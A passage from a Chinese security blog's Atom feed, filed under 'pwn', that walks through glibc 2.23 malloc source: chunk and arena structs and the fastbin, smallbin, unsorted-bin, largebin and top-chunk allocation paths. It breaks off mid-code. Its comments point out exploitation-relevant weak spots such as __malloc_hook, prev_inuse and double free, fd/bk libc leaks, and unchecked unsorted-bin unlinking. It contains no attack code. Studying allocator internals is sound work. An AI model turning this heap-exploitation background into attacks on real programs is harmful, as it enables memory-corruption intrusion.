class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><p><img alt="" data-src="/imgs/check_free.png" class="lozad"></p><p>来源 <a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">https://github.com/DhavalKapil/heap-exploitation</a></p><p><a href="https://heap-exploitation.dhavalkapil.com/author.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/author.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GI-libc-free&quot;&gt;&lt;a href=&quot;#GI-libc-free&quot; class=&quot;headerlink&quot; title=&quot;_GI___libc_free&quot;&gt;&lt;/a&gt;_GI___libc_free&lt;/h2&gt;&lt;p&gt;首先是 _GI___libc_free&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/malloc%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/malloc源码简单分析/</id>
    <published>2020-02-26T10:29:09.000Z</published>
    <updated>2020-04-08T12:37:14.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文中未做说明 均是指 glibc 2.23</p><h2 id="简单源码分析"><a href="#简单源码分析" class="headerlink" title="简单源码分析"></a>简单源码分析</h2><p>本节只是简单跟读了一下 malloc 的源码， 说的比较简单，很多细节还是要自己拿一份源代码来读</p><h2 id="堆中的一些数据结构"><a href="#堆中的一些数据结构" class="headerlink" title="堆中的一些数据结构"></a>堆中的一些数据结构</h2><h3 id="堆管理结构"><a href="#堆管理结构" class="headerlink" title="堆管理结构"></a>堆管理结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"> <span class="keyword">mutex_t</span> mutex;                 <span class="comment">/* Serialize access. */</span></span><br><span class="line"> <span class="keyword">int</span> flags;                       <span class="comment">/* Flags (formerly in max_fast). */</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line"> <span class="comment">/* Statistics for locking. Only used if THREAD_STATS is defined. */</span></span><br><span class="line"> <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> mfastbinptr fastbins[NFASTBINS];    <span class="comment">/* Fastbins */</span></span><br><span class="line"> mchunkptr top;</span><br><span class="line"> mchunkptr last_remainder;</span><br><span class="line"> mchunkptr bins[NBINS * <span class="number">2</span>];</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];   <span class="comment">/* Bitmap of bins */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>           <span class="comment">/* Linked list */</span></span><br><span class="line"> INTERNAL_SIZE_T system_mem;</span><br><span class="line"> INTERNAL_SIZE_T max_system_mem;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><ul><li>malloc_state结构是我们最常用的结构，其中的重要字段如下：</li><li>fastbins：存储多个链表。每个链表由空闲的fastbin组成，是fastbin freelist。</li><li>top ：top chunk，指向的是arena中剩下的空间。如果各种freelist都为空，则从top chunk开始分配堆块。</li><li>bins：存储多个双向链表。意义上和堆块头部的双向链表一样，并和其组成了一个双向环状空闲列表（freelist）。这里的bins位于freelist的结构上的头部，后向指针（bk）指向freelist逻辑上的第一个节点。分配chunk时从逻辑上的第一个节点分配寻找合适大小的堆块。</li></ul><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>prev_size：相邻的前一个堆块大小。这个字段只有在前一个堆块（且该堆块为normal chunk）处于释放状态时才有意义。这个字段最重要（甚至是唯一）的作用就是用于堆块释放时快速和相邻的前一个空闲堆块融合。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题。</li><li>size：本堆块的长度。长度计算方式：size字段长度+用户申请的长度+对齐。libc以 size_T 长度<em>2 为粒度对齐。例如 32bit 以 4</em>2=8byte 对齐，64bit 以 8*2=0×10 对齐。因为最少以8字节对齐，所以size一定是8的倍数，故size字段的最后三位恒为0，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则 bit=1。libc判断 当前堆块是否处于free状态的方法 就是 判断下一个堆块的 pre_inuse 是否为 1 。这里也是 double free 和 null byte offset 等漏洞利用的关键。</li><li>fd &amp;bk：双向指针，用于组成一个双向空闲链表。故这两个字段只有在堆块free后才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据。两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果。</li><li>值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表。</li></ul><p>来源 <a href="https://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/91527.html</a></p><h2 id="maclloc-源码分析"><a href="#maclloc-源码分析" class="headerlink" title="maclloc 源码分析"></a>maclloc 源码分析</h2><p>用户调用 malloc 时会先进入 __libc_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">// 如果设置了 __malloc_hook 就执行然后返回</span></span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置了 __malloc_hook 就执行它然后返回， 否则进入 _int_malloc 这个函数就是 malloc 的具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     计算出实际需要的大小，大小按照 2 * size_t 对齐， 64位： 0x10</span></span><br><span class="line"><span class="comment">     所以如个 malloc(0x28) ----&gt; nb = 0x30, 0x10 header + 0x20 当前块 + 0x8 下一块的 pre_size</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">    如果是第一次触发 malloc, 就会调用 sysmalloc---&gt; mmap 分配内存返回</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先把传入的 bytes 转换为 chunk 的实际大小，保存到 nb 里面。然后如果是第一次调用 malloc , 就会进入 sysmalloc 分配内存。</p><h3 id="搜索Fastbin"><a href="#搜索Fastbin" class="headerlink" title="搜索Fastbin"></a>搜索Fastbin</h3><p>接着会看申请的 nb 是不是在 fastbin 里面，如果是进入 fastbin 的处理流程<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);  <span class="comment">// 找到nb 对应的 fastbin 的 索引 idx</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">// 找到对应的 fastbin 的指针</span></span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>) <span class="comment">//如果 fastbin 非空，就进入这里</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">// 判断大小是否满足 fastbin相应bin的大小要求</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先根据 nb 找到该大小对应的 fastbin 的项， 然后看看该 fastbin 是不是为空，如果非空，就分配该 fastbin 的第一个 chunk 给用户。<br>分配过程还会检查待分配的 chunk 的 size 是不是满足在该 fastbin 项的限制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index (chunksize (victim)) != idx</span><br></pre></td></tr></table></figure></p><h3 id="搜索Smallbin"><a href="#搜索Smallbin" class="headerlink" title="搜索Smallbin"></a>搜索Smallbin</h3><p>如果 fastbin 为空或者 nb 不在 fastbin 里面，就会进入 smallbin 和 largebin 的处理逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//  找到 smallbin 索引</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 判断 bin 中是不是有 chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 链表检查</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置下一个chunk的 in_use 位</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     大内存分配，进入 malloc_consolidate</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果申请的 nb 位于 smallbin 的范围，就会 fastbin 一样去找对应的项，然后判断 bin 是不是为空，如果不空, 分配第一个 chunk 给用户，分配之前还会校验该 chunk 是不是正确的。如果为空，就会进入 unsorted bin 的处理了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely (bck-&gt;fd != victim)</span><br></pre></td></tr></table></figure><p>如果 nb 不满足 smallbin ，就会触发 malloc_consolidate . 然后进入 unsorted bin</p><h3 id="搜索Unsorted-bin"><a href="#搜索Unsorted-bin" class="headerlink" title="搜索Unsorted bin"></a>搜索Unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">// 遍历 unsorted bin</span></span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">             bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">             victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             remainder = chunk_at_offset (victim, nb);</span><br><span class="line">             unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">             av-&gt;last_remainder = remainder;</span><br><span class="line">             remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">             <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">               &#123;</span><br><span class="line">                 remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">             set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>遍历 unsorted bin ， 如果此时的 unsorted bin 只有一项，且他就是 av-&gt;last_remainder ,同时大小满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)</span><br></pre></td></tr></table></figure><p>就对当前 unsorted bin 进行切割，然后返回切割后的 unsorted bin 。</p><p>否则就先把该 unsorted bin 从 unsorted list 中移除下来，这里用了一个 类似 unlink 的操作，不过没有检查 chunk 的指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*先摘下该 unsorted bin  */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 如果申请的大小和该 unsorted bin的大小刚好相等，就直接返回</span></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>如果申请的大小和该 unsorted bin 的大小刚好相等，就直接返回， 否则就把它放到相应的 bin 里面去。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              .......</span><br><span class="line">              .......</span><br></pre></td></tr></table></figure></p><h3 id="搜索-Largebin"><a href="#搜索-Largebin" class="headerlink" title="搜索 Largebin"></a>搜索 Largebin</h3><p>接下来就会去搜索 largebin 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line">             <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                list does not have to be rerouted.  */</span></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                   victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                   &#123;</span><br><span class="line">                     errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                     <span class="keyword">goto</span> errout;</span><br><span class="line">                   &#125;</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Top-chunk"><a href="#使用-Top-chunk" class="headerlink" title="使用 Top chunk"></a>使用 Top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 